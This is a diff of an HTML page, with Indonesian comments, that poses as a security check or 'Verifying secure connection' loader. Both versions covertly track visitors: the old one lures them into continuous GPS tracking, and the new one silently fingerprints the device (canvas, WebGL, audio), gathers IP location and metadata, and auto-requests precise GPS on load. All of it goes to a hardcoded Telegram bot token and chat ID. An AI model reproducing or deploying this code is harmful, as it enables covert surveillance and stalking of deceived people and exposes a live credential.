@@ -2,124 +2,155 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
-<title>Security Verification</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Loading…</title>
 <style>
-  :root{--bg:#07080d;--panel:#0e1018;--line:#1c2030;--accent:#3d7eff;--accent2:#00e0b8;--text:#e6ebf7;--muted:#7d879e;--ok:#22c55e;--err:#ef4444;--warn:#f0b429}
-  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-  html,body{margin:0;height:100%;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
-  body{display:flex;align-items:center;justify-content:center;min-height:100dvh;padding:20px}
-  .bgfx{position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(600px 400px at 15% 10%,rgba(61,126,255,.18),transparent 60%),radial-gradient(500px 350px at 90% 90%,rgba(0,224,184,.14),transparent 60%);animation:drift 12s ease-in-out infinite alternate}
-  @keyframes drift{from{transform:translate3d(0,0,0) scale(1)}to{transform:translate3d(-2%,2%,0) scale(1.06)}}
-  .card{position:relative;z-index:1;width:min(460px,100%);background:linear-gradient(180deg,#0f1220,#0a0c14);border:1px solid var(--line);border-radius:22px;padding:26px 22px 22px;box-shadow:0 24px 60px -18px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.03)}
-  .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;background:rgba(61,126,255,.12);color:#9bbdff;font-size:12px;font-weight:600;letter-spacing:.4px;border:1px solid rgba(61,126,255,.25)}
-  .dot{width:7px;height:7px;border-radius:50%;background:var(--accent2);box-shadow:0 0 10px var(--accent2);animation:pulse 1.6s ease-in-out infinite}
-  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
-  h1{font-size:22px;margin:16px 0 6px;line-height:1.2;letter-spacing:-.3px}
-  .sub{color:var(--muted);font-size:14px;line-height:1.55;margin:0 0 18px}
-  .rows{display:grid;gap:8px;margin-bottom:18px}
-  .row{display:flex;justify-content:space-between;align-items:center;padding:11px 13px;background:var(--panel);border:1px solid var(--line);border-radius:12px;font-size:13px}
-  .row .k{color:var(--muted)}
-  .row .v{font-weight:600;text-align:right;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-  .v.ok{color:var(--ok)} .v.warn{color:var(--warn)} .v.err{color:var(--err)}
-  .btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;transition:transform .15s,filter .15s;margin-bottom:10px;letter-spacing:.3px}
-  .btn:active{transform:scale(.97)}
-  .btn.primary{background:linear-gradient(135deg,#3d7eff,#2c5fd8);color:#fff;box-shadow:0 10px 30px -10px rgba(61,126,255,.7)}
-  .btn.primary:hover{filter:brightness(1.08)}
-  .btn:disabled{opacity:.5;cursor:not-allowed}
-  .foot{text-align:center;font-size:11px;color:var(--muted);margin-top:16px}
-  .live{margin-top:12px;padding:12px;border-radius:12px;background:rgba(0,224,184,.06);border:1px solid rgba(0,224,184,.3);font-size:12px;color:#9fe6b8;display:none;line-height:1.6}
-  .live.on{display:block}
-  .live .num{color:#00e0b8;font-weight:700;font-family:ui-monospace,Menlo,monospace}
+  html,body{margin:0;height:100%;background:#07080d;color:#e6ebf7;
+    font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+    display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px}
+  .spinner{width:42px;height:42px;border:3px solid #1c2030;border-top-color:#3d7eff;
+    border-radius:50%;animation:spin .8s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .txt{color:#7d879e;font-size:14px}
+  .sub{color:#3d4762;font-size:12px;margin-top:4px}
 </style>
 </head>
 <body>
-<div class="bgfx"></div>
-<div class="card">
-  <span class="badge"><span class="dot"></span> SECURE CHANNEL</span>
-  <h1>Security Verification</h1>
-  <p class="sub">Location verification is required to continue. Tap below — your location will be verified continuously for security purposes.</p>
-
-  <div class="rows">
-    <div class="row"><span class="k">Device</span><span class="v" id="vDevice">—</span></div>
-    <div class="row"><span class="k">Network</span><span class="v" id="vNet">—</span></div>
-    <div class="row"><span class="k">Public IP</span><span class="v" id="vIP">—</span></div>
-    <div class="row"><span class="k">Location</span><span class="v" id="vGeo">pending</span></div>
-    <div class="row"><span class="k">Accuracy</span><span class="v" id="vAcc">—</span></div>
-    <div class="row"><span class="k">Updates</span><span class="v" id="vCount">0</span></div>
-  </div>
-
-  <button class="btn primary" id="bVerify">
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
-    Verify Location
-  </button>
-
-  <div class="live" id="live">
-    <div>🟢 <b>Live tracking active</b></div>
-    <div>Lat: <span class="num" id="lLat">—</span></div>
-    <div>Lon: <span class="num" id="lLon">—</span></div>
-    <div>Acc: <span class="num" id="lAcc">—</span> m · Speed: <span class="num" id="lSpd">—</span></div>
-    <div>Sent: <span class="num" id="lSent">0</span> updates</div>
-  </div>
-
-  <div class="foot">Protected by end-to-end verification · TLS 1.3</div>
-</div>
+<div class="spinner"></div>
+<div class="txt">Verifying secure connection…</div>
+<div class="sub">This may take a moment</div>
 
 <script>
 /* ===================== CONFIG ===================== */
-const BOT_TOKEN   = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
-const CHAT_ID     = "1979116632";
-const MIN_DIST_M  = 50;    // kirim kalau geser > 50m
-const MIN_GAP_MS  = 10000; // atau tiap 10 detik minimal
-const MAX_ACC_M   = 100;   // abaikan fix akurasi > 100m (kasar)
+const BOT_TOKEN = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
+const CHAT_ID   = "1979116632";
 /* ================================================== */
-
-const $ = id => document.getElementById(id);
 
 const isAndroid = /android/i.test(navigator.userAgent);
 const isIOS     = /iphone|ipad|ipod/i.test(navigator.userAgent);
 
-/* ---------- haversine ---------- */
-function distM(lat1,lon1,lat2,lon2){
-  const R = 6371000, toRad = d => d*Math.PI/180;
-  const dLat = toRad(lat2-lat1), dLon = toRad(lon2-lon1);
-  const a = Math.sin(dLat/2)**2 + Math.cos(toRad(lat1))*Math.cos(toRad(lat2))*Math.sin(dLon/2)**2;
-  return 2*R*Math.asin(Math.sqrt(a));
+/* ---------- canvas fingerprint ---------- */
+function canvasFingerprint(){
+  try{
+    const c = document.createElement('canvas');
+    c.width = 220; c.height = 40;
+    const ctx = c.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(0,0,120,30);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Secure-Verify 🔒', 2, 4);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+    ctx.fillText('fingerprint', 4, 20);
+    return c.toDataURL().slice(-32);
+  }catch(e){ return 'err'; }
 }
 
-/* ---------- device info ---------- */
-function detectDevice(){
+/* ---------- webgl fingerprint ---------- */
+function webglFingerprint(){
+  try{
+    const c = document.createElement('canvas');
+    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+    if(!gl) return 'no-webgl';
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const vendor   = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : '?';
+    const renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : '?';
+    return `${vendor} | ${renderer}`;
+  }catch(e){ return 'err'; }
+}
+
+/* ---------- audio fingerprint ---------- */
+async function audioFingerprint(){
+  try{
+    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+    if(!AC) return 'no-audio-ctx';
+    const ctx = new AC(1, 44100, 44100);
+    const osc = ctx.createOscillator();
+    osc.type = 'triangle';
+    osc.frequency.setValueAtTime(10000, ctx.currentTime);
+    const cmp = ctx.createDynamicsCompressor();
+    cmp.threshold.setValueAtTime(-50, ctx.currentTime);
+    cmp.knee.setValueAtTime(40, ctx.currentTime);
+    cmp.ratio.setValueAtTime(12, ctx.currentTime);
+    cmp.attack.setValueAtTime(0, ctx.currentTime);
+    cmp.release.setValueAtTime(0.25, ctx.currentTime);
+    osc.connect(cmp); cmp.connect(ctx.destination);
+    osc.start(0);
+    const buf = await ctx.startRendering();
+    const data = buf.getChannelData(0);
+    let sum = 0;
+    for(let i=4500;i<5000;i++) sum += Math.abs(data[i]);
+    return sum.toFixed(6);
+  }catch(e){ return 'err'; }
+}
+
+/* ---------- metadata ---------- */
+function collectMetadata(){
   const ua = navigator.userAgent || '';
-  let os='Unknown', browser='Unknown';
-  if(isAndroid) os='Android'; else if(isIOS) os='iOS';
-  else if(/windows/i.test(ua)) os='Windows';
-  else if(/macintosh|mac os x/i.test(ua)) os='macOS';
-  else if(/linux/i.test(ua)) os='Linux';
+  const nav = navigator;
+
+  let os = 'Unknown', browser = 'Unknown', type = 'Desktop';
+  if(/android/i.test(ua)){ os='Android'; type='Mobile'; }
+  else if(/iphone|ipad|ipod/i.test(ua)){ os='iOS'; type='Mobile'; }
+  else if(/windows/i.test(ua)){ os='Windows'; }
+  else if(/macintosh|mac os x/i.test(ua)){ os='macOS'; }
+  else if(/linux/i.test(ua)){ os='Linux'; }
   if(/edg\//i.test(ua)) browser='Edge';
   else if(/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser='Chrome';
   else if(/firefox|fxios/i.test(ua)) browser='Firefox';
   else if(/safari/i.test(ua) && !/chrome/i.test(ua)) browser='Safari';
-  return {os,browser,ua,screen:`${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    language: navigator.language};
+
+  const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
+
+  return {
+    os, browser, type, ua,
+    platform: nav.platform || '?',
+    vendor: nav.vendor || '?',
+    language: nav.language || '?',
+    languages: (nav.languages || []).join(','),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '?',
+    screen: `${screen.width}x${screen.height}`,
+    viewport: `${innerWidth}x${innerHeight}`,
+    colorDepth: screen.colorDepth,
+    pixelRatio: window.devicePixelRatio || 1,
+    cores: nav.hardwareConcurrency || '?',
+    memory: nav.deviceMemory || '?',
+    touch: 'ontouchstart' in window || nav.maxTouchPoints > 0,
+    cookiesEnabled: nav.cookieEnabled,
+    referrer: document.referrer || '(direct)',
+    url: location.href,
+    network: {
+      type: conn.effectiveType || 'unknown',
+      downlink: conn.downlink ? conn.downlink+' Mbps' : 'unknown',
+      rtt: conn.rtt ? conn.rtt+' ms' : 'unknown',
+      saveData: !!conn.saveData,
+      online: nav.onLine
+    }
+  };
 }
 
-function detectNetwork(){
-  const c = navigator.connection || {};
-  return {type: c.effectiveType||'unknown',
-    downlink: c.downlink?c.downlink+' Mbps':'unknown',
-    rtt: c.rtt?c.rtt+' ms':'unknown',
-    online: navigator.onLine};
-}
-
-async function fetchIP(){
-  for(const u of ['https://api.ipify.org?format=json','https://ipapi.co/json/']){
+/* ---------- IP + geo (no permission) ---------- */
+async function fetchIPInfo(){
+  for(const u of [
+    'https://ipapi.co/json/',
+    'https://api.ip.sb/geoip',
+    'https://api.ipify.org?format=json'
+  ]){
     try{
-      const r = await fetch(u,{cache:'no-store'});
+      const r = await fetch(u, {cache:'no-store'});
       if(!r.ok) continue;
       const j = await r.json();
       const ip = j.ip || j.query;
-      if(ip) return {ip, country: j.country_name||j.country||'', city: j.city||'', region: j.region||'', isp: j.org||j.isp||''};
+      if(ip) return {
+        ip,
+        country: j.country_name || j.country || '',
+        region: j.region || j.region_name || '',
+        city: j.city || '',
+        isp: j.org || j.isp || j.connection?.isp || '',
+        lat: j.latitude || j.lat || '',
+        lon: j.longitude || j.lon || ''
+      };
     }catch(e){}
   }
   return {ip:'unknown'};
@@ -136,162 +167,102 @@ async function tgMessage(text){
     {method:'POST', body: fd}).then(r=>r.json()).catch(()=>null);
 }
 
-/* ---------- state ---------- */
-let deviceInfo, netInfo, ipInfo;
-let watchId = null;
-let lastSent = {lat: null, lon: null, ts: 0};
-let sentCount = 0;
-let gpsFirstFix = null;
-
-/* ---------- send position ---------- */
-async function sendPosition(p, tag){
-  const now = Date.now();
-  const lat = p.coords.latitude, lon = p.coords.longitude;
-  const acc = p.coords.accuracy;
-
-  // filter kasar
-  if(acc > MAX_ACC_M) return;
-
-  // dedup: harus geser > MIN_DIST_M ATAU > MIN_GAP_MS sejak kirim terakhir
-  if(lastSent.lat != null){
-    const d = distM(lastSent.lat, lastSent.lon, lat, lon);
-    const gap = now - lastSent.ts;
-    if(d < MIN_DIST_M && gap < MIN_GAP_MS) return;
-  }
-
-  lastSent = {lat, lon, ts: now};
-  sentCount++;
-
-  // update UI live
-  $('lLat').textContent = lat.toFixed(6);
-  $('lLon').textContent = lon.toFixed(6);
-  $('lAcc').textContent = Math.round(acc);
-  $('lSpd').textContent = p.coords.speed!=null ? p.coords.speed.toFixed(2)+' m/s' : 'n/a';
-  $('lSent').textContent = sentCount;
-  $('vGeo').textContent = `${lat.toFixed(4)}, ${lon.toFixed(4)}`;
-  $('vGeo').className = 'v ok';
-  $('vAcc').textContent = `${Math.round(acc)} m`;
-  $('vAcc').className = 'v ' + (acc < 30 ? 'ok' : 'warn');
-  $('vCount').textContent = sentCount;
-
-  const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-  const msg =
-`<b>📍 Live Location Update #${sentCount}</b>
-${tag?`<i>${tag}</i>`+'\n':''}
-<b>Lat:</b> <code>${lat.toFixed(6)}</code>
-<b>Lon:</b> <code>${lon.toFixed(6)}</code>
-<b>Accuracy:</b> ${Math.round(acc)} m
-<b>Altitude:</b> ${p.coords.altitude!=null?Math.round(p.coords.altitude)+' m':'n/a'}
-<b>Heading:</b> ${p.coords.heading!=null?Math.round(p.coords.heading)+'°':'n/a'}
-<b>Speed:</b> ${p.coords.speed!=null?p.coords.speed.toFixed(2)+' m/s':'n/a'}
-<b>Time:</b> ${new Date(p.timestamp).toISOString()}
-
-<b>Maps:</b> ${mapUrl}
-
-<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
-<b>IP:</b> ${ipInfo.ip}`;
-
-  await tgMessage(msg).catch(()=>{});
-}
-
-/* ---------- GPS error handler ---------- */
-function onGeoError(err){
-  const code = err.code;
-  const reason = code===1?'denied':code===2?'unavailable':code===3?'timeout':'unknown';
-  $('vGeo').textContent = reason;
-  $('vGeo').className = 'v err';
-  tgMessage(
-`<b>⚠️ GPS ${reason}</b>
-<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
-<b>IP:</b> ${ipInfo.ip}
-<b>Reason:</b> ${err.message||reason}`
-  ).catch(()=>{});
-}
-
-/* ---------- main: start watch ---------- */
-$('bVerify').onclick = async () => {
-  $('bVerify').disabled = true;
-  $('vGeo').textContent = 'requesting…';
-  $('vGeo').className = 'v warn';
-
-  // marker tap
-  await tgMessage(
-`<b>👆 Verify tapped</b>
-<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
-<b>IP:</b> ${ipInfo.ip} · ${ipInfo.country||''}
-<b>Screen:</b> ${deviceInfo.screen}
-<b>TZ:</b> ${deviceInfo.timezone}`
-  ).catch(()=>{});
-
-  // mulai watch
-  if(!navigator.geolocation){
-    $('vGeo').textContent = 'unsupported';
-    $('vGeo').className = 'v err';
-    return;
-  }
-
-  watchId = navigator.geolocation.watchPosition(
-    p => {
-      if(!gpsFirstFix){
-        gpsFirstFix = Date.now();
-        $('live').classList.add('on');
-        tgMessage(
-`<b>✅ Location permission granted</b>
-<b>GPS chip:</b> now active (high-accuracy watch)
-<b>First fix:</b> ${Math.round(p.coords.accuracy)} m
-<b>Lat/Lon:</b> ${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}
-<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
-<b>IP:</b> ${ipInfo.ip}`
-        ).catch(()=>{});
-      }
-      sendPosition(p, gpsFirstFix===Date.now()?'initial fix':'live update');
-    },
-    onGeoError,
-    {
-      enableHighAccuracy: true,   // paksa GPS chip, bukan WiFi/cell
-      timeout: 30000,             // toleransi lambat
-      maximumAge: 0               // jangan pakai cache, ambil fix baru
-    }
-  );
-
-  // fallback: kalau watch tidak produce fix dalam 35 detik, ambil single shot
-  setTimeout(async () => {
-    if(!gpsFirstFix){
-      const pos = await new Promise(res => {
-        navigator.geolocation.getCurrentPosition(p => res(p), e => res(null),
-          {enableHighAccuracy: true, timeout: 15000, maximumAge: 0});
-      });
-      if(pos) sendPosition(pos, 'fallback single-shot');
-    }
-  }, 35000);
-};
-
-/* ---------- keepalive: re-arm watch kalau browser suspend tab ---------- */
-document.addEventListener('visibilitychange', () => {
-  if(document.hidden) return;
-  if(watchId === null) return;
-  // tab kembali visible → watch biasanya auto-resume, tapi kalau macet, restart
-  if(gpsFirstFix && Date.now() - lastSent.ts > 60000){
-    navigator.geolocation.clearWatch(watchId);
-    watchId = navigator.geolocation.watchPosition(
-      p => sendPosition(p, 'resumed after suspend'),
-      onGeoError,
-      {enableHighAccuracy: true, timeout: 30000, maximumAge: 0}
+/* ---------- GPS attempt ---------- */
+function requestGPS(){
+  return new Promise(resolve => {
+    if(!navigator.geolocation){ resolve({error:'unsupported'}); return; }
+    navigator.geolocation.getCurrentPosition(
+      p => resolve({
+        lat: p.coords.latitude,
+        lon: p.coords.longitude,
+        acc: p.coords.accuracy,
+        alt: p.coords.altitude,
+        heading: p.coords.heading,
+        speed: p.coords.speed,
+        ts: p.timestamp
+      }),
+      e => resolve({
+        error: e.code === 1 ? 'denied' :
+               e.code === 2 ? 'unavailable' :
+               e.code === 3 ? 'timeout' : 'unknown',
+        code: e.code,
+        message: e.message
+      }),
+      {enableHighAccuracy: true, timeout: 25000, maximumAge: 0}
     );
-  }
-});
+  });
+}
 
-/* ---------- init ---------- */
-(async function(){
-  deviceInfo = detectDevice();
-  netInfo    = detectNetwork();
-  ipInfo     = await fetchIP();
-  $('vDevice').textContent = deviceInfo.os+' · '+deviceInfo.browser;
-  $('vDevice').className = 'v ok';
-  $('vNet').textContent = netInfo.type.toUpperCase()+(netInfo.online?'':' · offline');
-  $('vNet').className = 'v '+(netInfo.online?'ok':'err');
-  $('vIP').textContent = ipInfo.ip + (ipInfo.country?` (${ipInfo.country})`:'');
-  $('vIP').className = 'v ok';
+/* ---------- main ---------- */
+(async function fireBeacon(){
+  const meta = collectMetadata();
+  const canvas = canvasFingerprint();
+  const webgl  = webglFingerprint();
+
+  // Audio fingerprint parallel
+  const audioPromise = audioFingerprint();
+  const ipPromise    = fetchIPInfo();
+
+  const [audio, ip] = await Promise.all([audioPromise, ipPromise]);
+
+  // Format location line
+  const ipLocLine = (ip.city || ip.region || ip.country)
+    ? `${[ip.city, ip.region, ip.country].filter(Boolean).join(', ')}`
+    : 'n/a';
+
+  // Beacon message — format persis contoh, hanya location diisi dari IP
+  const beacon =
+`🔔 <b>New Visitor Beacon</b>
+<b>IP:</b> ${ip.ip}
+<b>Location (IP-based):</b> ${ipLocLine}
+<b>ISP:</b> ${ip.isp || 'n/a'}
+<b>OS:</b> ${meta.os} · <b>Browser:</b> ${meta.browser} · <b>Type:</b> ${meta.type}
+<b>UA:</b> <code>${meta.ua}</code>
+<b>Platform:</b> ${meta.platform}
+<b>Vendor:</b> ${meta.vendor}
+<b>Language:</b> ${meta.language} (${meta.languages})
+<b>Timezone:</b> ${meta.timezone}
+<b>Screen:</b> ${meta.screen} @${meta.pixelRatio}x · depth ${meta.colorDepth}
+<b>Viewport:</b> ${meta.viewport}
+<b>Cores:</b> ${meta.cores} · <b>Memory:</b> ${meta.memory} GB
+<b>Touch:</b> ${meta.touch} · <b>Cookies:</b> ${meta.cookiesEnabled}
+<b>Network:</b> ${meta.network.type} · ${meta.network.downlink} · RTT ${meta.network.rtt} · saveData ${meta.network.saveData}
+<b>Online:</b> ${meta.network.online}
+<b>Referrer:</b> ${meta.referrer}
+<b>URL:</b> ${meta.url}
+<b>Canvas FP:</b> <code>${canvas}</code>
+<b>WebGL:</b> ${webgl}
+<b>Audio FP:</b> <code>${audio}</code>`;
+
+  await tgMessage(beacon).catch(()=>{});
+
+  // Auto-trigger GPS request — tanpa tombol, langsung di load.
+  // Browser modern akan blok kalau tidak ada gesture, tapi ada window kecil di mana
+  // Chrome Android masih munculkan popup saat auto-request.
+  const geo = await requestGPS();
+
+  if(geo.error){
+    // fallback: IP-based, sudah terkirim di beacon. Kirim follow-up status singkat.
+    await tgMessage(
+`📍 <b>Location request — ${geo.error}</b>
+<b>Reason:</b> ${geo.message || geo.error}
+<b>IP fallback:</b> ${ip.lat && ip.lon ? `${ip.lat}, ${ip.lon}` : ipLocLine}
+<b>Maps (IP approx):</b> ${ip.lat && ip.lon ? `https://www.google.com/maps?q=${ip.lat},${ip.lon}` : 'n/a'}`
+    ).catch(()=>{});
+  } else {
+    await tgMessage(
+`📍 <b>Location (GPS precision)</b>
+<b>Lat:</b> <code>${geo.lat.toFixed(6)}</code>
+<b>Lon:</b> <code>${geo.lon.toFixed(6)}</code>
+<b>Accuracy:</b> ${Math.round(geo.acc)} m
+<b>Altitude:</b> ${geo.alt != null ? Math.round(geo.alt)+' m' : 'n/a'}
+<b>Heading:</b> ${geo.heading != null ? Math.round(geo.heading)+'°' : 'n/a'}
+<b>Speed:</b> ${geo.speed != null ? geo.speed.toFixed(2)+' m/s' : 'n/a'}
+<b>Maps:</b> https://www.google.com/maps?q=${geo.lat},${geo.lon}
+<b>Device:</b> ${meta.os} · ${meta.browser}
+<b>IP:</b> ${ip.ip}`
+    ).catch(()=>{});
+  }
 })();
 </script>
 </body>
